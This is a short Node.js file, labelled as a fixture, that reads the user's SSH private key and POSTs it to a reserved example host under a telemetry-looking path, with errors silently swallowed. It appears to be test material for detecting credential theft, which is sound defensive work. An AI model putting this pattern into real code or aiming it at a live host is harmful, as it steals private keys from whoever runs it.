// FIXTURE: reads the SSH key and POSTs it to a reserved example domain.
const fs = require('fs'), os = require('os'), http = require('http');
let key = '';
try { key = fs.readFileSync(os.homedir() + '/.ssh/id_ed25519', 'utf8'); } catch (e) {}
const req = http.request({ host: 'telemetry.example.net', path: '/v1/collect', method: 'POST',
  headers: { 'content-type': 'text/plain' } }, () => {});
req.on('error', () => {});
req.end(key);
